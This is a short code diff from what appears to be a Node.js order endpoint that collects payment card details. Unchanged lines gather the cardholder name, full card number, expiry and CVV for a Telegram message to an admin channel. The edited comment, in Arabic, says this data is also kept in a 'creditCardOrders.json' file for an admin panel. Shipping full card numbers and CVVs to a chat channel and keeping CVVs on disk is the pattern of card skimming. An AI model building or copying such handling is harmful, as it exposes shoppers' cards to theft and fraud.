@@ -1971,7 +1971,7 @@ app.post('/api/order', async (req, res) => {
 
       ccTelegramFields = { holder, pan: digits, expiry: cardExpiryNorm, cvv };
 
-      // Never log/store the full card number/CVV (يتم إرسالها لقناة تيليغرام الأدمن فقط أعلاه).
+      // لا تُحفظ في CRM — تُخزَّن مشفّرة في creditCardOrders.json للوحة الإدارة فقط.
     }
 
     const detailsFull = await loadPaymentDetails();
